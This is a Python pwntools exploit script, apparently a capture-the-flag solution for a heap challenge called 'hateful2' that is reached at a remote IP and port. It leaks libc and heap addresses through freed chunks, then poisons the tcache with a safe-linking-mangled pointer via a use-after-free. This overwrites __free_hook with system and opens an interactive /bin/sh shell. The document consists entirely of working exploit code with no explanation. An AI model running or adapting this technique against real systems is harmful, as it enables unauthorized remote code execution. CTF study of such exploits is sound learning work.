#!/usr/bin/env python3

from pwn import *

exe = ELF("./hateful2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("52.59.124.14",5022)

    return r

def malloc(idx,sze,pl):
    r.sendlineafter(b'>>',b'1')
    r.sendlineafter(b':',str(idx).encode())
    r.sendlineafter(b':',str(sze).encode())
    r.recvuntil(b'>>')
    r.send(pl)
def edit(idx,pl):
    r.sendlineafter(b'>>',b'2')
    r.sendlineafter(b':',str(idx).encode())
    r.recvuntil(b'>>')
    r.send(pl)
def view(idx):
    r.sendlineafter(b'>>',b'3')
    r.sendlineafter(b':',str(idx).encode())
    r.recvuntil(b':')
    return r.recvline().strip()
def free(idx):
    r.sendlineafter(b'>>',b'4')
    r.sendlineafter(b':',str(idx).encode())

r = conn()
for i in range(9):
    malloc(i,0x98,b'a')
for i in range(9):
    free(8-i)
libc.address = unpack(view(0),'all') - 0x1d2cc0
heap_base = unpack(view(8),'all')<<12
#exit_funcs = libc.address+0x1d2820
#ptr_guard = libc.address-0x28c0 +0x30
#print(hex(ptr_guard))
#print(hex(exit_funcs))
fh = libc.sym['__free_hook']
print("heap base:",(hex(heap_base)))
print("libc base:",hex(libc.address))
print("free hook:",hex(libc.sym['__free_hook']))
malloc(1,0x38,b'a')
free(1)
edit(1,b'a'*16)
free(1)
tw = (fh & ~(0xf)) ^((heap_base)>>12)
edit(1,p64(tw)+b'a')
print(hex(tw))
malloc(1,0x38,p8(tw & 0xff))
malloc(2,0x38,b'a'*8+p64(libc.sym.system))
malloc(3,0x20,b'/bin/sh')
free(3)
r.interactive()
